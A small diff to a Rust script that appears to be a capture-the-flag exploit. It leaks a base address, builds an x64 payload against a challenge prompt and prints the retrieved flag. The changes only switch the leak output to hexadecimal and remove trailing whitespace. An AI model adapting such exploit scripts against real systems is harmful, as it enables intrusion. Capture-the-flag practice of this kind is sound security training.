@@ -42,7 +42,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             })
             .condition(|&leak| leak > 0x1000000)
             .payload(|base_leak| {
-                println!("Base leak: {base_leak}");
+                println!("Base leak: {base_leak:x}");
                 Payload::builder()
                     .x64()
                     .recv_until_utf8("Verify new coordinates? (y/n): ", false)
@@ -91,7 +91,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let flag = pipe.payload(payload).await?;
         println!("Flag: {flag}");
-        
+
         break;
     }
 
